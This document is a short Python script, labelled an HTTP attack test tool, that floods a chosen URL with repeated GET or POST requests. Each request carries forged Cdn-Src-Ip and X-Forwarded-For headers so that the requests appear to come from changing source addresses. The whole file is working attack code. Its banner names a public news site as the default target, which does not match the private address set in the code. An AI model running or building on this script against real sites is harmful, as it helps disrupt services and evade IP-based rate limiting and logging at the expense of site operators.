# -*-coding: utf-8-*-
# @Time    : 2017/7/17 18:01
# @Author  : Haoranz
# @Function: Simulate HTTP DDoS Strike with CDN-SRC-IP and XFF IP.

import requests
import re

def main(url,attackTimes,attackType, cdn, xff):
    host = url.split('/',3)[2]
    s = requests.Session()
    # Attack Logic
    for x in range(1, attackTimes + 1):
        # Cdn-Src-Ip字段
        CdnSrcIp = "111.111.111." + str(x) + ",112.112.112." + str(x)
        # X-Forwarded-For字段
        XFFIp = "221.221.221." + str(x) + ",222.222.222." + str(x)  
        ddosRequest = sendRequest(x,host,url,attackType,cdn,xff)
        res = s.send(ddosRequest)
        if (res.text):
            resStr = ("Attack finished " + str(x) + " times.")
            if(cdn!=0):
                resStr += " And Cdn-Src-Ip is "+CdnSrcIp
            if(xff!=0):
                resStr += ", X-Forwarded-For is "+XFFIp
            print(resStr)
def sendRequest(x,host,url,attackType,cdn=1,xff=1):
    headers = {
        "Host": str(host), "Connection": "keep-alive", "Cache-Control": "max-age=0",
               "Upgrade-Insecure-Requests": "1",
               "User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36",
               "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
               "Accept-Encoding": "gzip, deflate, sdch", "Accept-Language": "zh-CN,zh;q=0.8",
               "Cookie": "wp-settings-9=mfold%3Do%26libraryContent%3Dbrowse%26editor%3Dtinymce%26dfw_width%3D822; wp-settings-time-9=1486447106",
               "If-None-Match": "444e9-3b-53 cd8e4152373", "If-Modified-Since": "Mon, 19 Sep 2016 09:25:20 GMT"
               }
    # Cdn-Src-Ip字段
    if(cdn == 1):
        headers['Cdn-Src-Ip'] = "111.111.111." + str(x) + ",112.112.112." + str(x)
    # X-Forwarded-For字段
    if(xff == 1):
        headers['X-Forwarded-For'] = "221.221.221." + str(x) + ",222.222.222." + str(x)
    ddosRequest = requests.Request(attackType, url, headers=headers).prepare()
    return ddosRequest

if __name__ == "__main__":
    # Attack Defualt Config.
    url = "http://172.17.153.38/index.html"
    attackTimes = 10
    attackType = "GET"
    cdn = 1
    xff = 1

    modType = input(
'''
***********************************************************************
**                  HTTP Attack Test Tool                            **
**            Author  : Haoranz/haoranz@126.com                      **
**   Function: Simulate HTTP DDoS Strike with CDN-SRC-IP and XFF IP  **
***********************************************************************

The Default Config:
    1.  Target URL = http://www.sina.com/"
    2.  Test Times = 10
    3.  Test Type  = GET
    4.  Cdn-Src-Ip in Headers
    5.  X-Forwarded-For in Headers
Type the ID you want to Change. For example: 1 or 123
Type ENTER if you do not want to change.
''')
    if ("1" in modType):
        urlStr = input("Input the Attack Target URL you want and type Enter.\n")
        match = "((http|ftp|https)://)(([a-zA-Z0-9\._-]+\.[a-zA-Z]{2,6})|([0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}))(:[0-9]{1,4})*(/[a-zA-Z0-9\&%_\./-~-]*)?"
        if(re.compile(match).match(urlStr) != None):
            url = urlStr
    if ("2" in modType):
        attackTimesStr = input("Input the Attack Times you want and type Enter.\n")
        if(attackTimesStr.isdigit()):
            attackTimes = int(attackTimesStr)
    if ("3" in modType):
        attackTypeStr = input('''Input the Attack Type you want.
                           Get     1
                           POST    2
                           Other   3\n''')
        if(attackTypeStr.isdigit()):
            if(attackTypeStr == "1"):
                attackType = "GET"
            elif(attackTypeStr == "2"):
                attackType = "POST"
            else:
                attackType = "OTHER"
    if ("4" in modType):
        cdn = 0
        print("No Cdn-Src-Ip in Headers NOW.")
    if ("5" in modType):
        xff = 0
        print("No X-Forwarded-For in Headers NOW.")

    main(url, attackTimes, attackType, cdn, xff)
    input("Type the ENTER Key to Exit...")
